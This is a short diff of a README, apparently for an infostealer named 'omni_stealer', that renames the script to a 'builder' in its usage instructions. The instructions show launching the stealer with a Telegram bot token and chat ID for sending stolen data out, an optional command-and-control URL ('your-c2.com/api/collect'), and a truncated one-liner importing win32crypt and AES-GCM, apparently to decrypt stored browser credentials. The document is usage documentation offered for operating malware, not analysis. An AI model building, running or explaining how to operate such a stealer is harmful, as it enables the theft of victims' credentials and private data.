@@ -107,13 +107,13 @@ python -c "import win32crypt; from cryptography.hazmat.primitives.ciphers.aead i
 
 ```powershell
 # Interactive mode (prompts for Telegram credentials)
-python omni_stealer_v4.py
+python omni_stealer_builder.py
 
 # Command-line mode
-python omni_stealer_v4.py "<BOT_TOKEN>" "<CHAT_ID>"
+python omni_stealer_builder.py "<BOT_TOKEN>" "<CHAT_ID>"
 
 # With optional HTTP C2
-python omni_stealer_v4.py "<BOT_TOKEN>" "<CHAT_ID>" "https://your-c2.com/api/collect"
+python omni_stealer_builder.py "<BOT_TOKEN>" "<CHAT_ID>" "https://your-c2.com/api/collect"
 
 # Using environment variables
 set TELEGRAM_BOT_TOKEN=your_token
